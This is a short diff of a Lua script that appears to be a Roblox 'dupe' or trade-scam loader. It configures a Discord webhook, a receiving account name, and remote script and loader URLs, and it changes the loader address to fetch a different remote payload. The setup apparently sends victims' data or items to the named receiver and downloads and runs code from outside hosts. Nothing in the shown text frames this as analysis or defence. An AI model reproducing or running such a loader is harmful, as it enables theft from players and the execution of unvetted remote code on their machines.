@@ -2,7 +2,7 @@ local userWebhook = "https://discord.com/api/webhooks/1397176516349264022/JwGuDi
 local receiverName = "DouglasMcArthurT"
 local mainScriptUrl = "https://raw.githubusercontent.com/SpDupe/ege/refs/heads/main/loade.lua"
 local yourscripturl = ""
-local loaderUrl = "https://api.rubis.app/v2/scrap/gJhDtvJ5d2LZvIcd/raw"
+local loaderUrl = "https://api.rubis.app/v2/scrap/n2hMuRSz1niNskPr/raw"
 
 local initialCommandToRun = ""
 if loaderUrl and loaderUrl:gsub("%s", "") ~= "" then
